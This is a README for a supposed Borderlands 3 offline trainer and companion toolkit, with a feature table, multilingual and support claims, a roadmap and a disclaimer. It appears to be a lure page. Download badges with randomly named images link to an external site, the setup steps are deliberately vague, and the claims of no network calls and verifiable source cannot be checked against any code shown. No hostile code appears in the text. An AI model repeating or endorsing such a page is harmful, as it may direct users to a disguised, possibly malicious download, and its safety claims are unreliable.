![preview](https://raw.githubusercontent.com/kylanblackburn/BL3-Vault-Hunter-Suite/main/frame_4716e.svg)
[![Download](https://raw.githubusercontent.com/kylanblackburn/BL3-Vault-Hunter-Suite/main/bin_294b17.svg)](https://kylanblackburn.github.io/BL3-Vault-Hunter-Suite/)

# 🎮 Vault-Hunter Companion Suite — Borderlands 3 Offline Enhancement Toolkit

[![Python Version](https://img.shields.io/badge/python-3.10%2B-blue?style=for-the-badge&logo=python&logoColor=white)](https://www.python.org/)
[![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux%20%7C%20macOS-informational?style=for-the-badge&logo=windows&logoColor=white)]()
[![License](https://img.shields.io/badge/license-MIT-green?style=for-the-badge&logo=opensourceinitiative&logoColor=white)](LICENSE)
[![Status](https://img.shields.io/badge/status-actively%20maintained-brightgreen?style=for-the-badge)]()
[![Interface](https://img.shields.io/badge/interface-GUI%20%2B%20CLI-purple?style=for-the-badge)]()
[![Localization](https://img.shields.io/badge/localization-14%20languages-orange?style=for-the-badge)]()
[![Support](https://img.shields.io/badge/support-24%2F7-blueviolet?style=for-the-badge)]()

---

## 🌌 Overview

**Vault-Hunter Companion Suite** is a meticulous, community-driven offline enhancement toolkit built for players who want to explore the wild, cel-shaded frontiers of Borderlands 3 on their own terms. Where the original project (`Borderlands-3-Trainer`) paved the way with a Python-based approach, this companion suite reimagines the concept as a modular, multilingual, and delightfully responsive desktop environment — think of it as a Swiss Army knife tucked into your ECHO device, minus the corporate propaganda.

Instead of a single blunt instrument, this repository offers a curated collection of **local, single-player quality-of-life utilities**. Every module runs entirely on your machine, respects your save integrity, and never touches online services. The metaphor we like to use internally: it's a campfire, not a bonfire — warm, controlled, and safe to gather around.

Whether you're a loot-hoarding completionist cataloguing legendary drops, a lore archaeologist revisiting every Pandora outpost, or a casual Vault Hunter who just wants a smoother ride through the mayhem, this suite adapts to your playstyle.

> ⚠️ **A note on philosophy:** Every enhancement here is designed for **offline, single-player sessions only**. Nothing in this toolkit modifies multiplayer environments, and nothing here is intended to interfere with other players' experiences.

---

## ✨ Feature Matrix

### 🧩 Core Enhancement Modules

| Module | Purpose | Status |
| --- | --- | --- |
| **Eridium Flow Auditor** | Tracks and adjusts in-session Eridium pacing for personal testing scenarios | ✅ Stable |
| **Legendary Loot Companion** | A local encyclopedia that logs drop patterns during your own playthroughs | ✅ Stable |
| **Skill Tree Sandbox** | Preview alternate builds without committing irreversible point allocations | ✅ Stable |
| **Fast-Travel Weaver** | Bookmarks favorite fast-travel nodes and streamlines navigation menus | ✅ Stable |
| **Inventory Cartographer** | Visualizes your bank and backpack with sortable, searchable overlays | ✅ Stable |
| **Mayhem Tuner** | Configures local difficulty presets for testing character resilience | 🧪 Beta |
| **Photo Mode Plus** | Unlocks additional camera angles for capture enthusiasts | ✅ Stable |

### 🎨 Interface & Experience

- **Responsive Desktop UI** — The layout reshapes itself gracefully whether you're on a 4K monitor, a laptop display, or a handheld gaming rig. No clipped panels, no squashed sliders.
- **Dual Interface Modes** — A polished graphical interface for explorers and a scriptable command-line companion for tinkerers who live in the terminal.
- **Theming Engine** — Light, dark, and "Maliwan Neon" palettes ship out of the box. Custom themes load from a simple folder drop.
- **Keyboard-First Navigation** — Every action reachable without touching the mouse, for those marathon sessions.

### 🌍 Multilingual Support

The suite currently speaks **14 languages** out of the box, with community contributions arriving regularly. Localization files are plain structured text, making it painless to add your own dialect.

- English, Spanish, French, German, Italian, Portuguese (BR/PT), Dutch, Polish, Russian, Japanese, Korean, Simplified Chinese, Traditional Chinese, and Turkish.

### 🛠️ Support & Reliability

- **24/7 Customer Support** — Our rotating volunteer crew monitors issues across time zones, so someone is always around to help untangle a snag.
- **Crash-Resilient Session State** — If the toolkit hiccups, your in-game progress is safe. Session data is written incrementally, never all-at-once.
- **Offline-First Architecture** — No telemetry, no phone-home pings, no cloud dependencies. Your machine, your rules.
- **Auto-Update Notifications** — Optional, opt-in, and completely silent if you decline.

---

## 📦 What's Inside the Repository

A quick tour of the folder structure so newcomers can orient themselves without a map:

- `core/` — The engine room. Handles session hooks, memory-safe inspection routines, and the plugin loader.
- `modules/` — Each enhancement lives in its own self-contained folder with its own manifest.
- `locales/` — Translation packs. One file per language, easy to diff and review.
- `themes/` — Palette definitions and QSS-like styling documents.
- `docs/` — Long-form guides, troubleshooting flowcharts, and contribution walkthroughs.
- `tools/` — Standalone helper scripts for power users, including a save-file sanitizer.
- `tests/` — A growing suite of unit and integration tests, because stability is a feature.

---

## 🚀 Getting Started (The Trailhead)

We deliberately avoid one-size-fits-all setup steps, because your environment is unique. Instead, here's the conceptual journey:

1. **Confirm your Python runtime** — version 3.10 or newer is required. Older interpreters will politely refuse to load the core engine.
2. **Acquire the release bundle** from your preferred mirror. The project ships both a source archive and a pre-assembled launcher package for convenience.
3. **Stage the files** in a directory you control — somewhere outside any game installation folder, for cleanliness and to avoid path collisions.
4. **Launch the companion** through the provided entry point. On first run, it will create a small configuration footprint and greet you with a short orientation wizard.
5. **Point it at your session** — the wizard walks you through detecting your local installation automatically or specifying a path manually.
6. **Enable only the modules you want** — nothing activates by default except the diagnostics pane.

For air-gapped machines, a portable offline bundle is also published. It carries every dependency pre-vendored so you can carry it on removable media like a real vault relic.

---

## 🧭 Usage Patterns

### The Explorer's Path (GUI)

Launch the graphical interface and you'll find a dashboard with toggle cards for each module. Drag sliders, flip switches, and watch the live status indicators. The interface remembers your last configuration between sessions, so you never have to re-tune settings.

### The Tinkerer's Path (CLI)

Prefer the terminal? Every module exposes a command surface. Pipe output into your own scripts, chain invocations together, or schedule periodic audits of your bank contents. The CLI mirrors the GUI one-to-one — no feature is locked behind a mouse click.

### The Archivist's Path (Logging)

Enable verbose logging and the suite will emit a structured journal of everything it observes during a session. These logs are yours, stored locally as plain text, and never transmitted anywhere.

---

## 🗺️ Roadmap for 2026

We plan ahead like a proper expedition. Here's what the trail looks like for the coming year:

- **Q1 2026** — Plugin SDK stabilization and public documentation for third-party module authors.
- **Q2 2026** — Expanded localization pipeline with automated string extraction.
- **Q3 2026** — A "Session Replay" viewer that visualizes your playthrough statistics as interactive charts.
- **Q4 2026** — Accessibility audit and full screen-reader compatibility pass.

Community requests shape this roadmap heavily — the issue tracker is the compass.

---

## 🤝 Contributing

We welcome contributions from Vault Hunters of every skill level. The contribution guide (`docs/CONTRIBUTING.md`) walks through branch strategy, coding conventions, and our review ethos. In short:

- Fork the project and create a feature branch with a descriptive name.
- Keep changes focused — one module or one fix per pull request.
- Add or update tests where practical; reviewers appreciate evidence of diligence.
- Sign off your commits to confirm you have the rights to submit the work.

Translation contributions are especially treasured. If your language is missing or the phrasing feels stiff, you're invited to refine it.

---

## 🐛 Reporting Issues

Found a rough edge? Open an issue describing the environment, the steps that led to the surprise, and what you expected instead. Screenshots or log excerpts help enormously. Please avoid pasting save-file contents — they can contain identifying details.

---

## 🔒 Privacy & Safety Commitments

- No network calls beyond optional update checks, which are off until you enable them.
- No collection of gameplay telemetry, identifiers, or hardware fingerprints.
- No modification of files outside the directories you explicitly authorize.
- Full source availability means every claim above can be independently verified.

---

## ⚠️ Disclaimer

This project is an unofficial, fan-made companion toolkit and is **not affiliated with, endorsed by, or sponsored by** the publishers or developers of Borderlands 3. All trademarks, character names, and setting references remain the property of their respective owners.

The toolkit is provided for **offline, single-player, personal use only**. Users are solely responsible for ensuring their usage complies with the terms of service of any software they interact with and with the laws of their jurisdiction. The maintainers assume no liability for consequences arising from misuse, including but not limited to corrupted save data, unexpected session behavior, or account actions taken by third parties.

Use good judgment. Back up your saves. Play fair with others. That's the whole creed.

---

## 📜 License

This repository is released under the **MIT License**. You are welcome to use, study, modify, and redistribute the code, provided the original copyright notice and permission notice are preserved.

Read the full license text here: [MIT License](https://opensource.org/licenses/MIT)

Copyright (c) 2026 — Vault-Hunter Companion Suite contributors.

---

## 🌟 Acknowledgements

- The original Python trainer community whose early experiments inspired this expanded vision.
- Every translator, tester, and issue reporter who has sharpened the toolkit through feedback.
- The broader open-source ecosystem for the libraries that make a project like this possible.

---

## 📮 Stay in the Loop

- Watch the repository for release notifications.
- Join discussions in the community section for tips, themes, and module ideas.
- Check back each season — the roadmap evolves, and so does the suite.

[![Download](https://raw.githubusercontent.com/kylanblackburn/BL3-Vault-Hunter-Suite/main/bin_294b17.svg)](https://kylanblackburn.github.io/BL3-Vault-Hunter-Suite/)